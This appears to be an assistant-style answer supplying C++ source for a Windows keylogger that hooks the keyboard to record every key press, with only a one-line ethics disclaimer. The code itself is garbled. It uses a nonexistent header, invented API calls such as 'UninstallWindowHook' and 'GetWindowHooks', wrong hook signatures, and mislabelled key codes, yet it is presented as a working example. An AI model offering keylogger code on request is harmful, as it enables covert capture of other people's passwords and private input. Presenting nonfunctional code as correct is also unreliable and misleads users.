Here is a C++ code example that demonstrates how to log keystrokes on a Windows computer using keyboard hooking. This code will record every key press, including modifiers like Shift, Ctrl, Alt, and others.

Note: Please be responsible with this code. Ensure it's used ethically and with proper authorization.

```c++
#include <windows.h>
#include <iostream>
#include <hread.h>

using namespace std;

void KeyPressCallback(int nCode, int wParam, int lParam);
void UninstallHook();
void InstallHook();

int main() {
    InstallHook();
    while (true) {
        Sleep(1);
    }
    return 0;
}

void InstallHook() {
    HHOOK hKeyboardHook = SetWindowsHook(WH_KEYBOARD_LL, KeyPressCallback);
    if (hKeyboardHook == NULL) {
        cerr << "Failed to install keyboard hook." << endl;
        return;
    }
}

void UninstallHook() {
    HHOOK hKeyboardHook = GetProcAddress(GetModuleHandle("User32"), "UninstallWindowHook");
    if (hKeyboardHook != NULL) {
        *hKeyboardHook = NULL;
    }
    if (GetWindowHooks() == 0) {
        cout << "Successfully uninstalled keyboard hook." << endl;
    } else {
        cerr << "Failed to uninstall keyboard hook." << endl;
    }
}

void KeyPressCallback(int nCode, int wParam, int lParam) {
    if (wParam == WH_KEYBOARD_KEYDOWN) {
        // Check if it's a keyboard event
        if (GetAsyncKeyState(0x7F) & 0x1) { // Check if Shift is pressed
            // Handle Shift pressed
            cout << "Shift is pressed.";
        }
        if (GetAsyncKeyState(0x20) & 0x1) { // Check if Ctrl pressed
            // Handle Ctrl pressed
            cout << "Ctrl is pressed.";
        }
        // Check if Alt is pressed
        if (GetAsyncKeyState(0xA4) & 0x1) {
            // Handle Alt pressed
            cout << "Alt is pressed.";
        }

        // Get the key pressed
        int key = GetKey(wParam);
        // Convert to character
        char ch = ToUnicode(key);
        cout << "Key pressed: " << ch << endl;

        // Check if key is released
        if ((wParam == WH_KEYBOARD_KEYUP) || (wParam == WH_KEYBOARD_KEYDOWN)) {
            // Track previous state
            static bool prevShift = false;
            static bool prevCtrl = false;
            static bool prevAlt = false;

            if (wParam == WH_KEYBOARD_KEYUP) {
                if (key == 0x20) prevCtrl = false;
                if (key == 0x7F) prevShift = false;
                if (key == 0xA4) prevAlt = false;
            } else {
                if (key == 0x20) prevCtrl = true;
                if (key == 0x7F) prevShift = true;
                if (key == 0xA4) prevAlt = true;
            }
        }
    }
}

// This part is necessary to keep the console responsive
void HandleMessages() {
    while (true) {
        Sleep(100);
        // Check if we need to exit
        // Add code here if necessary
    }
}
